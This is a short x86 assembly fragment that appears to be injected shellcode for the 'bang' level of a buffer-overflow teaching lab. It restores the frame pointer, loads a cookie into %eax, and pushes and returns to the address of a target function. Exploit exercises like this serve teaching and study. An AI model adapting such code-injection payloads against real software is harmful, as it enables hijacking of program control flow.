leal 0x28(%esp), %ebp  
mov  0x804d108, %eax    # get cookie to eax
push $0x08048e3a        # push bang into ret
ret                     # return
